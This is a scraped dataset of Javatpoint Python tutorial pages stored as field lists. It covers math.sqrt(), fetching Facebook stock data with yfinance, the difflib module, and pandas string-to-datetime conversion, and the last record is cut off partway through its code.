346,['The sqrt(): Math Function of Python'],['The sqrt() function is a built-in function in Python for performing operations related to math. The sqrt() function is used for returning the square root of any imported number.'],"['https://www.javatpoint.com/python-yfinance-module', 'https://www.javatpoint.com/floor-and-ceil-functions-in-python', 'https://www.javatpoint.com/python-yfinance-module', 'https://www.javatpoint.com/floor-and-ceil-functions-in-python', 'https://www.javatpoint.com/python-yfinance-module']",[],[],"['Application', 'Conclusion']","['Syntax:', 'Parameter:', 'Returns:', 'Example:', 'Error', 'Approach:']",[],"['In this tutorial, we will discuss how we can use the sqrt() function in Python.', ""'N' is any number which is greater or equal to 0 (N >= 0)."", 'It will return the square root of the number ""N"", that is passed as the parameter.', 'We get an error while executing the sqrt() function if the number passed as a parameter is less than ""0"" due to a runtime error.', 'Explanation:', 'We will use the following approach:', ""In this tutorial, we have discussed how to use Python's sqrt() function for calculating the square root of any number greater than 0.""]","['As at first, we passed ""16"" as a parameter, and we got the output as ""4"", but for ""-16"", which is less than ""0"", we got an error, saying ""math domain error"".', 'We can also use the sqrt() function for creating an application for performing math functions. Suppose we have a number ""N"", of which we have to check whether it is a prime number or not.']",[],"['math.sqrt(N)', '# importing the math module', 'import math as m', '# printing the square root of 7', 'print (""The square root of 7: "", m.sqrt(7))', '# printing the square root of 49', 'print (""The square root of 49: "", m.sqrt(49))', '# printing the square root of 115', 'print (""The square root of 115: "", m.sqrt(115))', '# import the math module', 'import math as m', 'print (""The square root of 16: "", m.sqrt(16))', '# printing the error when x less than 0', 'print (""The square root of -16: "", m.sqrt(-16))', 'import math as M', '# Creating a function for checking if the number is prime or not', 'def check_if(N):', 'if N == 1:', 'return False', '', '# Checking from 1 to sqrt(N)', 'for K in range(2, (int)(M.sqrt(N)) + 1):', 'if N % K == 0:', 'return False', 'return True', '# driver code', 'N = int( input(""Enter the number you want to check: ""))', 'if check_if(N):', 'print (""The number is prime"")', 'print (""The number is not prime"")']","['The square root of 7:  2.6457513110645907', 'The square root of 49:  7.0', 'The square root of 115:  10.723805294763608', 'The square root of 16:  4.0', '---------------------------------------------------------------------------', 'ValueError                                Traceback (most recent call last)', '<ipython-input-3-79d85b7d1d62> in <module>', '5', '6 # printing the error when x less than 0', '----> 7 print (""The square root of -16: "", m.sqrt(-16))', '8', 'ValueError: math domain error', 'Enter the number you want to check:  12', 'The number is not prime', 'Enter the number you want to check:  11', 'The number is prime', 'Enter the number you want to check:  53', 'The number is prime']",[],"['|||Step1: we will import the math module.|||Step 2: we will create a function ""check_if"" for checking if the given number is prime or not.|||Step 3: we will check if the number is equal to 1. If ""yes"", it will return false.|||Step 4: we will run a for loop from range ""2"" to ""sqrt(N)"".|||Step 5: we will check if any number between the given range divides ""N"".|||']"
347,['Python yfinance Module'],"['There are many instances when we have to get financial data or statements of a blogging site or even a browser sometimes. One of the famous browsers that allow us to collect its financial data is Yahoo, and actually, there are many instances when we need to perform this task. In this tutorial, we are going to learn about the yfinance module in Python, and we will learn how we can get financial data from Yahoo using this module and what kind of data we can collect from it.']","['https://www.javatpoint.com/difflib-module-in-python', 'https://www.javatpoint.com/sqrt-math-function-of-python', 'https://www.javatpoint.com/difflib-module-in-python', 'https://www.javatpoint.com/sqrt-math-function-of-python', 'https://www.javatpoint.com/difflib-module-in-python']","['https://static.javatpoint.com/python/images/python-yfinance-module.png', 'https://static.javatpoint.com/python/images/python-yfinance-module2.png']",[],"['yfinance Module in Python', 'Conclusion']","['Installation', 'Implementation', 'Collecting Financial Key Metrics from Yahoo:', 'Splitting the financial metric keys:', 'Retrieving Historical Market Prices:']","[""Note: The 'max' we have defined in the history function with the FB ticker is used to collect the history of market prices available for the maximum time period in Yahoo. The max keyword will retrieve the history of daily price changes for Facebook available in Yahoo."", 'Note: When we have to collect the data from a past fixed time, then we cannot give any duration argument in the history function because it will not be a valid argument. We have the following valid fixed time period arguments for the history function of the yfinance module: max, ytd, 10y, 5y, 2y, 1y, 6mo, 3mo, 1mo, 5d and 1d. We cannot give any other time period argument inside the history() function as it will be treated as an invalid argument, and no data of market prices history will be retrieved.']","['Step 1: Open the command prompt terminal of the device and locate the directory (using mkdir) where Python is installed in the system.', 'Step 2: Now write the following command in the terminal to install the yfinance module with pip installer:', 'Step 3: When we will press the enter key, the pip installer will start installing the yfinance module in the system at the defined path.', 'Example 1:', 'Look at the following Python program where we will retrieve the financial data of Facebook from Yahoo finance:', 'Explanation:', 'As we can see in the output, we have printed all the financial data as a whole Python dictionary.', 'Example 2:', 'Look at the following Python program where we will retrieve the financial key metrics from the Yahoo using yfinance module:', 'Explanation:', 'Example 3:', 'Look at the following Python program, where we will split the financial metric keys into key-value pairs:', 'Explanation:', 'We can even retrieve the historical market prices from Yahoo financial data, and then we can even print this information in the output.', 'Example 4:', ""Let's first look at the following example, and then we will understand more about retrieving historical market prices:"", 'Explanation:', 'Here, we are going to perform this function in two ways which are following:', 'Example 5:', ""Look at the following Python program where we will retrieve the last 3 month's history of market prices from Facebook:"", 'Explanation:', 'As we can see in the output, the history of market prices of the Facebook page in Yahoo since only last three months have been printed.', 'Example 6:', 'Look at the following Python program where we will retrieve history of market prices from Facebook for a user defined period of time:', 'Explanation:', 'We can see in the output that we have got the fixed time (which we set in the program) history of market prices from Yahoo.']","['In this section, we will learn how we can install the yfinance module in our system so that we can import it into a program and use its functions. We have to follow the following steps to install the yfinance module on our device:', 'As we can see, the yfinance module is successfully installed in our system, and now we can start working with it by importing it into a Python program.', ""Now, let's use the yfinance module in various example programs so that we can understand its function and implementation easily. Look at the following example programs using the yfinance module in them for collecting data:""]","[""The yfinance is one of the famous modules in Python, which is used to collect online data, and with it, we can collect the financial data of Yahoo. With the help of the yfinance module, we retrieve and collect the company's financial information (such as financial ratios, etc.) as well as the histories of marketing data by using its functions. But, before we start learning more about this module and its implementation as well as applications, we have to install the yfinance module in our system (as it is not a built-in module in Python). Once the installation process is done, we will proceed to the implementation part of the yfinance module."", 'Now, we will use the yfinance module in our Python program so that we can collect the financial data from Yahoo using it and understand its implementation. When we are using the yfinance module in our program, we have to pass the ticker as an argument inside the function (Here, Ticker is referred to as the ticker of a company).', 'Note: A ticker is basically a stock symbol or unique series of alphabets for the company names, and it is assigned to add an extra security layer for trading purposes. Look at the following examples of tickers that we will use in the yfinance module:', 'We have firstly imported the yfinance module as yahooFin in the program to use its functionality. Then, we have used the yahooFin with the FB Ticker function to collect all the financial information of the Facebook page from Yahoo. After retrieving the financial information from the Facebook page of Yahoo, we have printed this information in the output when the program is executed.', ""Other than retrieving the financial information from Yahoo sites (as we have performed in example 1), we can even collect various financial key metrics. These financial key metrics can be Price Earnings Ratio, Company Beta and Company Sector etc., from the whole Python dictionary that we printed in the above first example. Let's retrieve the financial key metrics by using the yfinance module."", 'Instead of retrieving complete financial data information from the page, we have retrieved only a limited set of financial key metrics in this program. We have firstly initialized three variables (keyPer, comSecKey and comBetaKey) and stored the values of financial key metrics from the financial data we have collected from the Facebook page. We have retrieved Price Earning Ratio, Company Beta and Company Sector financial metric keys in this example and stored them in the respective variable. After storing the financial metric keys, we have printed them in the output as a result, and as we can see in the output, details are successfully printed.', 'In the first and second examples, we have printed the financial data and metric keys from Yahoo as they are some dictionary values. But we can even split these values by means of key-value pair, and then we can print the split result. In the following example, we will print the financial metric keys values by splitting them, and we will split them by looping over them.', 'After retrieving information from the Facebook financial data from Yahoo, we have used for loop on it. With the help of for loop, we have looped over the data, and then we split the data items into key-value pairs. In last, we have printed these key-value pairs in the output as a result of the program.', ""In this example, we have imported the historical market prices from Facebook's financial data from the Yahoo page we retrieved in the program. We have retrieved the historical market prices from Facebook's financial data using the history() function with the FB Ticker, and then we have stored the information inside the variable we have initialized, i.e., maxHisMP. In last, we have printed this historical market prices information in the output as a result of the program. We can see the information regarding the history of market prices for the maximum period available in the Yahoo financial data."", ""Now, we have learned that how we can bring the history of market prices from Yahoo's financial data using its history() function. But here is a thing that we can even minimize our data which we are getting from history() to reduce its complexity. We can do this by giving a fixed time argument inside the history() function and retrieve only a small amount of data from Yahoo."", ""1. Collecting fixed time data since Last '1 day' or '5 day' or '1 month' or '3 month' etc., by providing fixed time argument inside the history function. Let's understand this by using the fixed time argument inside a program and then retrieving market prices from Yahoo."", ""We have used the same logic as we have used in the previous example program and collected the data of historical market prices from the Facebook page of Yahoo. But, in this program, instead of collecting the maximum data, we have limited our data by giving the argument '3mo' inside the history function so that it will only retrieve the history of market prices for the last three months only. And then, we printed this last three months market prices history in the output as a result."", ""2. Collecting fixed data from the history() function by giving start time and end time as the arguments of this history() function. We can retrieve the data of the time period which we want by defining starting and end time variables and then using these variables as the arguments of the history() function. Let's understand this by using these defined time arguments inside a program and then retrieving market prices history from Yahoo."", ""We have imported the yfinance as well as datetime module in this program so that we can use the datetime() function of it. Then, we defined two variables where we set start and end dates in them using the datetime function of the datetime module. Then, we used these variables inside the history() function as the start and end date of retrieving data from Yahoo. We have used the start and end keyword inside the history() to set the starting date and ending date for collecting the data. That's how we will retrieve a user fixed time's market prices history from Yahoo. In last, we have printed the minimized data in the output as a result."", ""In this tutorial, we have discussed how we can use the yfinance module in a Python program to retrieve simply Yahoo's financial data or various aspects of financial data of Yahoo by using functions given in the module and then we can print this data for further use.""]","['pip install yfinance', '# Import yfinance module in the program', 'import yfinance as yahooFin', '# Using ticker for the Facebook in yfinance function', 'retrFBInfo = yahooFin.Ticker(""FB"")', '# Printing Facebook financial information in the output', 'print(retrFBInfo.info)', '# Import yfinance module', 'import yfinance as yahooFin', '# Using ticker for the Facebook in yfinance function', 'retrFBInfo = yahooFin.Ticker(""FB"")', '# Getting Key metrics from the Facebook financial data we retrieved', ""comSecKey = retrFBInfo.info['sector'] # Company Sector key"", ""keyPER = retrFBInfo.info['trailinPE'] # Price Earning ratio key"", ""comBetaKey = retrFBInfo.info['beta'] # Company Beta key"", '# Print the Company Sector Information', 'print(""The Company Sector Metric key we collected from the page: "", comSecKey)', '# Print the Price Earnings Ratio (PER) from the FB page', 'print(""The Price Earnings Ratio (PER) we got from the financial data of page: "", keyPER)', '# Print the Company Beta metric from page', 'print(""The Company Beta key we retrieved from page: "", comBetaKey)', '# Import yfinance module', 'import yfinance as yahooFin', '# Using ticker for the Facebook in yfinance function', 'retrFBInfo = yahooFin.Ticker(""FB"")', '# Looping over items to split them in key-value pair', 'print(""Items from the financial data of the Facebook page in the key-value page: "")', 'for keyItem, valueItem in retrFBInfo.info.items():', 'print(keyItem, "":"", valueItem)', '# Import yfinance module', 'import yfinance as yahooFin', '# Using ticker for the Facebook in yfinance function', 'retrFBInfo = yahooFin.Ticker(""FB"")', '# Initializing variable for retrieving market prices', 'maxHisMP = retrFBInfo.history(period=""max"")', '# Printing the historical market prices in the output', 'print(""Historical Market Prices data from the Facebook page financial data of Yahoo: "")', 'print(maxHisMP)', '# Import yfinance module', 'import yfinance as yahooFin', '# Using ticker for the Facebook in yfinance function', 'retrFBInfo = yahooFin.Ticker(""FB"")', '# Initializing variable for retrieving market prices', 'his3MonMP = retrFBInfo.history(period=""3mo"")', '# Printing the historical market prices in the output', 'print(""Historical Market Prices data of last 3 months from the Facebook page of Yahoo: "")', 'print(his3MonMP)', '# Import yfinance module', 'import yfinance as yahooFin', '# Importing datetime module in the program', 'import datetime', '# Using ticker for the Facebook in yfinance function', 'retrFBInfo = yahooFin.Ticker(""FB"")', '# Define a start date variable', 'strtDate = datetime.datetime(2021, 4, 26)', '# Define an end date variable', 'endDate = datetime.datetime(2021, 8, 6)', '# Initializing variable for retrieving market prices', 'fixTimeMP = retrFBInfo.history(start = strtDate, end = endDate)', '# Printing the historical market prices in the output', 'print(""Historical Market Prices data of the time period we defined from the financial data of Facebook page: "")', 'print(fixTimeMP)']","['{\'zip\': \'94025\', \'sector\': \'Communication Services\', \'fullTimeEmployees\': 63404, \'longBusinessSummary\': ""Facebook, Inc. develops products that enable people to connect and share with friends and family through mobile devices, personal computers, virtual reality headsets, and in-home devices worldwide. The company\'s products include Facebook that enables people to connect, share, discover, and communicate with each other on mobile devices and personal computers; Instagram, a community for sharing photos, videos, and private messages; Messenger, a messaging application for people to connect with friends, family, groups, and businesses across platforms and devices; and WhatsApp, a messaging application that is used by people and businesses to communicate in a private way. It also provides Facebook Reality Labs, an augmented and virtual reality product that help people feel connected, anytime, and anywhere. Facebook, Inc. was founded in 2004 and is headquartered in Menlo Park, California."", \'city\': \'Menlo Park\', \'phone\': \'650-543-4800\', \'state\': \'CA\', \'country\': \'United States\', \'companyOfficers\': [], \'website\': \'http://investor.fb.com\', \'maxAge\': 1, \'address1\': \'1601 Willow Road\', \'industry\': \'Internet Content & Information\', \'ebitdaMargins\': 0.49698, \'profitMargins\': 0.37175998, \'grossMargins\': 0.80977, \'operatingCashflow\': 49358000128, \'revenueGrowth\': 0.556, \'operatingMargins\': 0.42523, \'ebitda\': 52079001600, \'targetLowPrice\': 225, \'recommendationKey\': \'buy\', \'grossProfits\': 69273000000, \'freeCashflow\': 22740000768, \'targetMedianPrice\': 425, \'currentPrice\': 330.05, \'earningsGrowth\': 1.006, \'currentRatio\': 5.425, \'returnOnAssets\': 0.17950001, \'numberOfAnalystOpinions\': 50, \'targetMeanPrice\': 417.22, \'debtToEquity\': 9.089, \'returnOnEquity\': 0.31332, \'targetHighPrice\': 500, \'totalCash\': 64079998976, \'totalDebt\': 12563000320, \'totalRevenue\': 104789999616, \'totalCashPerShare\': 22.728, \'financialCurrency\': \'USD\', \'revenuePerShare\': 36.82, \'quickRatio\': 5.095, \'recommendationMean\': 1.9, \'exchange\': \'NMS\', \'shortName\': \'Facebook, Inc.\', \'longName\': \'Facebook, Inc.\', \'exchangeTimezone', 'The Company Sector Metric key we collected from the page:  Communication Services', 'The Price Earnings Ratio (PER) we got from the financial data of page:  26.211199', 'The Company Beta key we retrieved from page:  1.295305', 'Items from the financial data of the Facebook page in the key-value page:', 'zip : 94025', 'sector : Communication Services', 'fullTimeEmployees : 63404', ""longBusinessSummary : Facebook, Inc. develops products that enable people to connect and share with friends and family through mobile devices, personal computers, virtual reality headsets, and in-home devices worldwide. The company's products include Facebook that enables people to connect, share, discover, and communicate with each other on mobile devices and personal computers; Instagram, a community for sharing photos, videos, and private messages; Messenger, a messaging application for people to connect with friends, family, groups, and businesses across platforms and devices; and WhatsApp, a messaging application that is used by people and businesses to communicate in a private way. It also provides Facebook Reality Labs, an augmented and virtual reality product that help people feel connected, anytime, and anywhere. Facebook, Inc. was founded in 2004 and is headquartered in Menlo Park, California."", 'city : Menlo Park', 'phone : 650-543-4800', 'state : CA', 'country : United States', 'companyOfficers : []', 'website : http://investor.fb.com', 'maxAge : 1', 'address1 : 1601 Willow Road', 'industry : Internet Content & Information', 'ebitdaMargins : 0.49698', 'profitMargins : 0.37175998', 'grossMargins : 0.80977', 'operatingCashflow : 49358000128', 'revenueGrowth : 0.556', 'operatingMargins : 0.42523', 'ebitda : 52079001600', 'Historical Market Prices data from the Facebook page financial data of Yahoo:', 'Open        High         Low       Close     Volume  \\', 'Date', '2012-05-18   42.049999   45.000000   38.000000   38.230000  573576400', '2012-05-21   36.529999   36.660000   33.000000   34.029999  168192700', '2012-05-22   32.610001   33.590000   30.940001   31.000000  101786600', '2012-05-23   31.370001   32.500000   31.360001   32.000000   73600000', '2012-05-24   32.950001   33.209999   31.770000   33.029999   50237200', '...                ...         ...         ...         ...        ...', '2021-10-04  335.529999  335.940002  322.700012  326.230011   42885000', '2021-10-05  328.579987  335.179993  326.160004  332.959991   35377900', '2021-10-06  329.739990  334.380005  325.799988  333.640015   26443000', '2021-10-07  337.000000  338.839996  328.980011  329.220001   28307500', '2021-10-08  331.510010  333.399994  328.709991  330.049988   15934300', 'Dividends  Stock Splits', 'Date', '2012-05-18          0             0', '2012-05-21          0             0', '2012-05-22          0             0', '2012-05-23          0             0', '2012-05-24          0             0', '...               ...           ...', '2021-10-04          0             0', '2021-10-05          0             0', '2021-10-06          0             0', '2021-10-07          0             0', '2021-10-08          0             0', '[2364 rows x 7 columns]', 'Historical Market Prices data of last 3 months from the Facebook page of Yahoo:', 'Open        High         Low       Close    Volume  \\', 'Date', '2021-07-09  345.320007  350.709991  345.269989  350.420013  13018700', '2021-07-12  351.230011  354.190002  349.640015  353.160004  10018600', '2021-07-13  351.500000  358.489990  348.799988  352.089996  11456000', '2021-07-14  354.559998  355.200012  346.730011  347.630005  13894200', '2021-07-15  349.230011  349.230011  340.220001  344.459991  14781600', '...                ...         ...         ...         ...       ...', '2021-10-04  335.529999  335.940002  322.700012  326.230011  42885000', '2021-10-05  328.579987  335.179993  326.160004  332.959991  35377900', '2021-10-06  329.739990  334.380005  325.799988  333.640015  26443000', '2021-10-07  337.000000  338.839996  328.980011  329.220001  28307500', '2021-10-08  331.510010  333.399994  328.709991  330.049988  15934300', 'Dividends  Stock Splits', 'Date', '2021-07-09          0             0', '2021-07-12          0             0', '2021-07-13          0             0', '2021-07-14          0             0', '2021-07-15          0             0', '...               ...           ...', '2021-10-04          0             0', '2021-10-05          0             0', '2021-10-06          0             0', '2021-10-07          0             0', '2021-10-08          0             0', '[65 rows x 7 columns]', 'Historical Market Prices data of the time period we defined from the financial data of Facebook page:', 'Open        High         Low       Close    Volume  \\', 'Date', '2021-04-26  303.339996  305.799988  301.559998  303.040009  16172600', '2021-04-27  304.279999  305.339996  301.109985  303.570007  15309300', '2021-04-28  307.359985  310.920013  305.369995  307.100006  33907200', '2021-04-29  330.119995  331.809998  321.609985  329.510010  56526800', '2021-04-30  326.140015  329.820007  324.500000  325.079987  26332400', '...                ...         ...         ...         ...       ...', '2021-07-30  354.000000  360.730011  352.940002  356.299988  15966700', '2021-08-02  358.100006  359.399994  350.739990  351.950012  13180400', '2021-08-03  352.730011  353.769989  347.700012  351.239990  12406100', '2021-08-04  352.420013  360.480011  351.510010  358.920013  14180600', '2021-08-05  359.640015  363.899994  356.899994  362.970001  10247200', 'Dividends  Stock Splits', 'Date', '2021-04-26          0             0', '2021-04-27          0             0', '2021-04-28          0             0', '2021-04-29          0             0', '2021-04-30          0             0', '...               ...           ...', '2021-07-30          0             0', '2021-08-02          0             0', '2021-08-03          0             0', '2021-08-04          0             0', '2021-08-05          0             0', '[72 rows x 7 columns]']",[],"['|||Ticker for Google is ""GOOGL""|||The ticker for Facebook is ""FB""|||and, Ticker for Amazon is ""AMZN"", etc.|||']"
348,['Difflib module in Python'],"['In the following tutorial, we will understand the Difflib module in the Python programming language. We will discuss the functioning of this module along with some examples based on its classes.']","['https://www.javatpoint.com/convert-the-column-type-from-string-to-datetime-format-in-pandas-dataframe', 'https://www.javatpoint.com/python-yfinance-module', 'https://www.javatpoint.com/convert-the-column-type-from-string-to-datetime-format-in-pandas-dataframe', 'https://www.javatpoint.com/python-yfinance-module', 'https://www.javatpoint.com/convert-the-column-type-from-string-to-datetime-format-in-pandas-dataframe']",[],[],"['Understanding the Python Difflib module', 'Understanding the Sequence Matcher class', 'Understanding the Differ class', 'Understanding the get_close_matches method', 'Understanding the unified_diff & context_diff classes']",[],['Note: The ratio() object is among a few that associated with the Sequence Matcher class. One can check the official documentation of Python to find out about more of these objects to perform different operations on sequences.'],"[""So, let's get begun."", 'Explanation:', ""As we have probably guessed, deleting a few of the characters visible in the first string will cause ' - ' to appear before the second line of text."", 'Let us consider the following example to understand the working of the Differ class.', 'Explanation:', 'This function allows us to compare the strings by each line rather than by each character.', 'We call the print() function and join the my_diff variable with a line enter so that the output is formatted in a method that makes it more readable.', 'Explanation:', 'Explanation:', 'The unified_diff class accepts two strings of data and then returns each word that was either inserted or deleted from the first.', 'Let us consider the following example for better understanding.', 'Explanation:', 'Let us consider the following example to understand the working of this class.', 'Explanation:']","['In order for the method to acknowledge the two strings, we have to assign each of the values of the string to the variables of the method, SquenceMatcher(a = str_1, b = str_2).', ""For example, while inserting new characters to the second string in a comparison between two strings, a ' + ' will pop up before the line that has received the extra characters."", ""If a line is the same in both sequences, ' ' will be returned, and if a line is missing, then ' ? ' will appear. Moreover, we can also use the attributes such as ratio(), which we discussed in the previous example."", 'In the above snippet of code, we have imported the difflib module along with the Differ class. We have then defined the two strings that we want to compare. We have then invoked the splitlines() function on the two strings.', 'Once we have defined a variable consisting of the Differ class, we create another containing Differ with the compare() object that takes in the two strings as arguments.', 'As we can observe the above syntax, the get_close_matches() method accepts the four parameters; however, it only requires the first two in order to return the output.', 'There are two classes in difflib that work in identical ways: the unified_diff and the context_diff. The only chief difference between the two is the result.', ""In the above example, we have used the context_diff to remove and add the words in the first string. The result of the same can be observed as the words altered are described with the '!' prefix.""]","['Difflib is a built-in module in the Python programming language consisting of different simple functions and classes that allow users to compare data sets. The module offers the outputs of these sequence comparisons in a format that can be read by a human, using deltas to show the differences more efficiently.', 'The difflib module is generally used to compare the sequence of the strings. But we can also use it to compare other data types as long as they are hash-able. We know that an object is hash-able if its hash value does not alter through the duration of its lifetime.', 'The most commonly utilized classes in the Python difflib module are the Differ and the Sequence Matcher classes. There are also a few other helper classes and functions that can assist with more particular operations. Let us understand of some these functions in the following sections.', 'Let us first begin with a fairly self-explanatory method of the difflib module: SequenceMatcher. The SequenceMatcher method will compare two provided strings and return the data representing the similarity between the two strings. Let us try this method with the help of the ratio() object. This object will return the comparison data in decimal format. An example for the same is shown below:', 'In the above snippet of code, we have first imported the difflib module along with the SequenceMatcher Class. We have then defined the two string values that we will compare with the help of that class. After that, we have created a new variable that encapsulates the SequenceMatcher class with two arguments, a and b, respectively. While the method actually accepts three arguments: None, a, and b.', 'Once every required variable have been defined, and the SequenceMatcher has been provided at least two arguments, we can now print the value with the help of the ratio() object that we have stated earlier. This object will determine the ratio of identical characters in the two strings, and the output is returned in the form of a decimal. Just like that, we have compared two simple strings and received an output on their resemblances.', 'The Differ class is considered the opposite of SquenceMatcher; it takes in lines of text and finds the differences between the strings. But the Differ class is special in its utilization of deltas, making it even more efficient and readable for humans for spotting the differences.', 'The difflib module serves another simple yet powerful utility as the get_close_matches method. This method is exactly what it sounds like: a tool that will accept parameters and return the closest matches to the target string. In pseudocode, the function runs in the following way:', 'The first argument is the word that has to be targeted; we want the method to return similarities. The second argument can be an array of variables or terms that points to an array of strings. The third argument enables the user to define a limit to the number of outputs that are returned. The last argument determines the similarity between two words need to be in order to be returned as an output.', 'With the first two arguments alone, the function will return outputs on the basis of the default cut-off of 0.6 (in the range of 0 - 1) and a default result limit of 3. Let us consider the following example to understand the working of this function.', ""In the above snippet of code, we have imported the difflib module and the get_close_matches method. We have then used the get_close_matches() method on a list of items with some similarities in their characters. Once we execute the program, the function will return only three words that have similar letters in them even though there is a fourth item similar to the word 'mas': 'massive'. Now, let us try defining a result_limit and a cutoff in the following example:"", ""In the above snippet of code, we have yielded four results that are at least 60% similar to the word 'mas'. The cutoff is equivalent to the original as we just defined the same value as the default, 0.6. However, we can change this parameter to make the results more or less strict. The closer to 1, the stricter the constraints will be."", ""In the above snippet of code, we have imported the required modules and defined two variables storing some words. We have then used the unified_diff() function to remove the words from the first variable and add the words from the second variable to the first one. As a result, we can observe that the unified_diff returns the removed words prefixed with - and returns the added words prefixed with +. The final word, 'Employees', consists of no prefix present in both strings."", ""The context_diff class works in a similar manner as the unified_diff. However, instead of revealing what was inserted and deleted from the original string, it simply returns what lines have changed by returning the changed lines with a prefix of '!'.""]","['# importing the difflib library and SequenceMatcher class', 'import difflib', 'from difflib import SequenceMatcher', '# defining the strings', 'str_1 = ""Welcome to Javatpoint""', 'str_2 = ""Welcome to Python tutorial""', '# using the SequenceMatcher() function', 'my_seq = SequenceMatcher(a = str_1, b = str_2)', '# printing the result', 'print(""First String:"", str_1)', 'print(""Second String:"", str_2)', 'print(""Sequence Matched:"", my_seq.ratio())', '# importing the difflib module and Differ class', 'import difflib', 'from difflib import Differ', '# defining the strings', 'str_1 = ""They would like to order a soft drink""', 'str_2 = ""They would like to order a corn pizza""', '# using the splitlines() function', 'lines_str1 = str_1.splitlines()', 'lines_str2 = str_2.splitlines()', '# using the Differ() and compare() function', 'dif = difflib.Differ()', 'my_diff = dif.compare(lines_str1, lines_str2)', '# printing the results', 'print(""First String:"", str_1)', 'print(""Second String:"", str_2)', 'print(""Difference between the Strings"")', ""print('\\n'.join(my_diff))"", 'lines_str1 = str_1.splitlines()', 'lines_str2 = str_2.splitlines()', 'my_diff = dif.compare(lines_str1, lines_str2)', 'get_close_matches(target_word, list_of_possibilities, n = res_limit, cutoff)', '# importing the difflib module and get_close_matches method', 'import difflib', 'from difflib import get_close_matches', '# using the get_close_matches method', ""my_list = get_close_matches('mas', ['master', 'mask', 'duck', 'cow', 'mass', 'massive', 'python', 'butter'])"", '# printing the list', 'print(""Matching words:"", my_list)', '# importing the difflib module and get_close_matches method', 'import difflib', 'from difflib import get_close_matches', '# using the get_close_matches method', 'my_list = get_close_matches(', ""'mas',"", ""['master', 'mask', 'duck', 'cow',"", ""'mass', 'massive', 'python', 'butter'],"", 'n = 4,', 'cutoff = 0.6', '# printing the list', 'print(""Matching words:"", my_list)', '# importing the required modules', 'import sys', 'import difflib', 'from difflib import unified_diff', '# defining the string variables', ""str_1 = ['Mark\\n', 'Henry\\n', 'Richard\\n', 'Stella\\n', 'Robin\\n', 'Employees\\n']"", ""str_2 = ['Arthur\\n', 'Joseph\\n', 'Stacey\\n', 'Harry\\n', 'Emma\\n', 'Employees\\n']"", '# using the unified_diff() function', 'sys.stdout.writelines(unified_diff(str_1, str_2))', '# importing the required modules', 'import sys', 'import difflib', 'from difflib import context_diff', '# defining the string variables', ""str_1 = ['Mark\\n', 'Henry\\n', 'Richard\\n', 'Stella\\n', 'Robin\\n', 'Employees\\n']"", ""str_2 = ['Arthur\\n', 'Joseph\\n', 'Stacey\\n', 'Harry\\n', 'Emma\\n', 'Employees\\n']"", '# using the context_diff() function', 'sys.stdout.writelines(context_diff(str_1, str_2))']","['First String: Welcome to Javatpoint', 'Second String: Welcome to Python tutorial', 'Sequence Matched: 0.5106382978723404', 'First String: They would like to order a soft drink', 'Second String: They would like to order a corn pizza', 'Difference between the Strings', '- They would like to order a soft drink', '?                            ^ ^^ ^^ ^^', '+ They would like to order a corn pizza', '?                            ^ ^^ ^ ^^^', ""Matching words: ['mass', 'mask', 'master']"", ""Matching words: ['mass', 'mask', 'master', 'massive']"", '---', '+++', '@@ -1,6 +1,6 @@', '-Mark', '-Henry', '-Richard', '-Stella', '-Robin', '+Arthur', '+Joseph', '+Stacey', '+Harry', '+Emma', 'Employees', '***', '---', '***************', '*** 1,6 ****', '! Mark', '! Henry', '! Richard', '! Stella', '! Robin', 'Employees', '--- 1,6 ----', '! Arthur', '! Joseph', '! Stacey', '! Harry', '! Emma', 'Employees']",[],[]
349,['Convert the Column Type from String to Datetime Format in Pandas DataFrame'],"['When we work with data in Pandas DataFrame of Python, it is pretty usual to encounter time series data. Panday is a strong tool that can handle time-series data in Python, and we might need to convert the string into Datetime format in the given dataset.']","['https://www.javatpoint.com/python-wxpython-module', 'https://www.javatpoint.com/difflib-module-in-python', 'https://www.javatpoint.com/python-wxpython-module', 'https://www.javatpoint.com/difflib-module-in-python', 'https://www.javatpoint.com/python-wxpython-module']",[],[],"['Different Approaches for Converting Datatype Format in Python:', 'Conclusion']","['Approach 1: Using pandas.to_datetime() Function', 'Approach 2: Using DataFrame.astype() Function.', 'Approach 3:', 'Approach 4:']",[],"['In this section, we will discuss different approaches we can use for changing the datatype of Pandas DataFrame column from string to datetime:', 'In this approach, we will use ""pandas.to_datetime()"" function for converting the datatype in Pandas DataFrame column.', 'Now, we can see that the format of the ""Data"" column in the DataFrame has been changed to the datetime format.', 'In this approach, we will use ""DataFrame.astype()"" function for converting the datatype in Pandas DataFrame column.', 'Suppose we have a date in ""yymmdd"" format in the DataFrame column, and we have to convert it from a string to a datetime format.', 'We can convert multiple columns from ""string"" to ""datetime"" format, which means ""YYYYMMDD"" format, by using the ""pandas.to_datetime()"" function.', 'In this tutorial, we learned different methods of converting the column type of Pandas DataFrame from string to datetime in Python.']","['Here, in the output, we can see that the Datatype of the ""Date"" column in the DataFrame is ""object"", which means it is a string. Now, we will convert the Datatype into datetime format by using the ""pnd.to_datetime()"" function:', 'Here, in the output, we can see that the Datatype of the ""Date"" column in the DataFrame is ""object"", which means it is a string. Now, we will convert the datatype into datetime format by using the ""Data_Frame.astype()"" function:', 'Now, we can see that the format of the ""Data"" column in the DataFrame has been changed to the datetime format by using data_frame[\'Date\'].astype(\'datetime64[ns]\'.', 'In the above code, we have changed the datatype of the column ""Date"" from ""object"" to ""datetime64[ns]"" by using ""pnd.to_datetime(data_frame[\'Date\'], format = \'%y%m%d\')"" function.', 'In the above output, we can see the datatype of ""Treatment_starting_Date"" and ""Treatment_ending_Date"" has been changed to datetime format by using the ""pnd.to_datetime()"" function.']","['In this tutorial, we will learn how to convert the DataFrame column of string into datetime format, ""dd/mm/yy"". The user cannot execute any time-series based operations on the dates if they are not in the required format. To deal with this, we need to convert the dates into the required date-time format.', 'Here, in the output we can see that the Datatype of the ""Date"" column in the DataFrame is ""object"", that means, it is string. Now, we will convert the datatype into datetime format by using ""data_frame[\'Date\'] = pnd.to_datetime(data_frame[\'Date\'], format = \'%y%m%d\')"" function.', 'Here, in the output, we can see that the Datatype of the ""Date"" column in the DataFrame is ""object"", which means it is a string. Now, we will convert the datatype ""Date"" column into datetime format by using ""pnd.to_datetime(data_frame[\'\'], format = \'%y%m%d\')"" function.']","['import pandas as pnd', '# Creating the dataframe', ""data_frame = pnd.DataFrame({'Date':['12/05/2021', '11/21/2018', '01/12/2020'],"", ""'Event':['Music- Dance', 'Poetry- Songs', 'Theatre- Drama'],"", ""'Cost':[15400, 7000, 25000]})"", '# Print the dataframe', 'print (""The data is: "")', 'print (data_frame)', ""# Here, we are checking the data type of the 'Date' column"", 'data_frame.info()', 'import pandas as 